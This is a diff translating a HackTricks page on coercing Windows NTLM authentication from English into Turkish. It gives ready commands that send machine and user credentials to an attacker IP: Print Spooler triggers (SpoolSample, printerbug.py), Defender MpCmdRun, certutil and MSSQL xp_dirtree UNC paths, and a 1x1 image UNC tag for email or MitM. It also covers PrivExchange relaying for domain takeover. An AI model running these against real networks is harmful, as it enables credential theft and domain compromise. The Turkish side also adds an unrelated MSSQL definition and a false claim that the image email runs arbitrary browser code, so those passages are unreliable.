@@ -1,137 +1,119 @@
-# Force NTLM Privileged Authentication
+# NTLM Yetkili Kimlik Doğrulamasını Zorlama
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
+* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** üzerinden PR göndererek paylaşın.
 
 </details>
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers), 3. taraf bağımlılıklardan kaçınmak için C# kullanarak MIDL derleyicisini kullanan **uzaktan kimlik doğrulama tetikleyicileri** koleksiyonudur.
 
-## Spooler Service Abuse
+## Spooler Servisi Kötüye Kullanımı
 
-If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
-Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.
+Eğer _**Print Spooler**_ servisi **etkinse**, AD kimlik bilgilerini kullanarak **Domain Controller'ın** yazıcı sunucusuna yeni baskı işleri hakkında bir **güncelleme talep edebilir** ve sadece bunu **bir sisteme bildirmesini söyleyebilirsiniz**.\
+Yazıcı, bir sisteme bildirim gönderdiğinde, o **sistemle kimlik doğrulaması yapması** gerekmektedir. Bu nedenle, saldırgan _**Print Spooler**_ servisini bir sisteme karşı kimlik doğrulaması yapması için zorlayabilir ve servis bu kimlik doğrulamasında **bilgisayar hesabını** kullanacaktır.
 
-### Finding Windows Servers on the domain
+### Etki Alanındaki Windows Sunucularını Bulma
 
-Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
-
+PowerShell kullanarak Windows makinelerinin bir listesini alın. Sunucular genellikle önceliklidir, bu yüzden onlara odaklanalım:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
+### Spooler hizmetinin dinlendiğini bulma
 
-### Finding Spooler services listening
-
-Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:
-
+Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'un) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) kullanarak, Spooler Hizmetinin dinlenip dinlenmediğini kontrol edin:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-
-You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol
-
+Ayrıca Linux üzerinde rpcdump.py kullanabilir ve MS-RPRN Protokolünü arayabilirsiniz.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
+### Bir hizmetten keyfi bir ana bilgisayara kimlik doğrulaması isteyin
 
-### Ask the service to authenticate against an arbitrary host
-
-You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
-
+[**Buradan SpoolSample'ı**](https://github.com/NotMedic/NetNTLMtoSilverTicket) derleyebilirsiniz.
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-
-or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux
-
+veya Linux üzerindeyseniz [**3xocyte'in dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanabilirsiniz.
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
+### Sınırsız Delege ile Birleştirme
 
-### Combining with Unconstrained Delegation
+Bir saldırganın zaten [Sınırsız Delege](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmiş olması durumunda, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Sınırsız delege nedeniyle, **yazıcının bilgisayar hesabının TGT'si**, sınırsız delegeye sahip olan bilgisayarın belleğinde **kaydedilecektir**. Saldırgan zaten bu ana bilgisayarı ele geçirdiği için, bu biletin **alınabilir** ve bunu istismar edebilir ([Bileti Geçir](pass-the-ticket.md)).
 
-If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
-
-## RCP Force authentication
+## RCP Zorla Kimlik Doğrulama
 
 {% embed url="https://github.com/p0dalirius/Coercer" %}
 
 ## PrivExchange
 
-The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.
+`PrivExchange` saldırısı, **Exchange Sunucusu `PushSubscription` özelliğinde** bulunan bir hata sonucunda ortaya çıkar. Bu özellik, Exchange sunucusunun, bir posta kutusu olan herhangi bir etki alanı kullanıcısının, HTTP üzerinden herhangi bir istemci tarafından sağlanan ana bilgisayara kimlik doğrulaması yapmasına zorlanmasına olanak tanır.
 
-By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.
+Varsayılan olarak, **Exchange hizmeti SYSTEM olarak çalışır** ve aşırı yetkilere sahiptir (özellikle, **2019 Öncesi Kumulatif Güncelleme'de etki alanı üzerinde WriteDacl yetkilerine sahiptir**). Bu hata, **bilgiyi LDAP'ye iletmek ve ardından etki alanı NTDS veritabanını çıkarmak** için istismar edilebilir. LDAP'ye iletim mümkün olmadığında, bu hata yine de etki alanı içindeki diğer ana bilgisayarlara iletim ve kimlik doğrulaması yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde istismar edilmesi, herhangi bir kimlik doğrulanmış etki alanı kullanıcı hesabıyla hemen Etki Alanı Yöneticisi erişimi sağlar.
 
-## Inside Windows
+## Windows İçinde
 
-If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:
+Eğer zaten Windows makinesinin içindeyseniz, Windows'u ayrıcalıklı hesapları kullanarak bir sunucuya bağlamak için aşağıdaki komutu kullanabilirsiniz:
 
 ### Defender MpCmdRun
-
 ```bash
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
 ```
-
 ### MSSQL
 
+MSSQL, Microsoft SQL Server'ın kısaltmasıdır. Bu, Microsoft tarafından geliştirilen ve yaygın olarak kullanılan bir ilişkisel veritabanı yönetim sistemidir. MSSQL, Windows tabanlı sistemlerde çalışır ve birçok farklı uygulama ve web sitesinde veritabanı yönetimi için kullanılır. MSSQL, güçlü bir veritabanı motoruna sahiptir ve geniş bir özellik seti sunar, bu nedenle birçok kuruluş tarafından tercih edilir.
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
-
-Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+Veya bu başka bir teknik kullanılabilir: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-It's possible to use certutil.exe lolbin (Microsoft-signed binary) to coerce NTLM authentication:
-
+Certutil.exe lolbin'i (Microsoft imzalı ikili dosya) kullanarak NTLM kimlik doğrulamasını zorlamak mümkündür:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
+## HTML enjeksiyonu
 
-## HTML injection
+### E-posta aracılığıyla
 
-### Via email
-
-If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
-
+Eğer hedeflediğiniz makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, sadece ona bir **1x1 boyutunda bir görüntü içeren e-posta** gönderebilirsiniz. Böylece, e-posta içerisine HTML enjeksiyonu yaparak, kullanıcının tarayıcısında istediğiniz kodu çalıştırabilirsiniz.
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-
-and when he opens it, he will try to authenticate.
+ve onu açtığında kimlik doğrulama yapmaya çalışacak.
 
 ### MitM
 
-If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:
-
+Bir bilgisayara MitM saldırısı gerçekleştirebilir ve bir sayfaya HTML enjekte edebilirseniz, aşağıdaki gibi bir resim enjekte etmeyi deneyebilirsiniz:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
+## NTLMv1 Kırma
 
-## Cracking NTLMv1
-
-If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
-_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
+[NTLMv1 zorluklarını yakalayabiliyorsanız, onları nasıl kıracağınızı buradan okuyun](../ntlm/#ntlmv1-saldirisi).\
+_Unutmayın, NTLMv1'i kırmak için Responder zorluğunu "1122334455667788" olarak ayarlamanız gerekmektedir._
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
 
 </details>
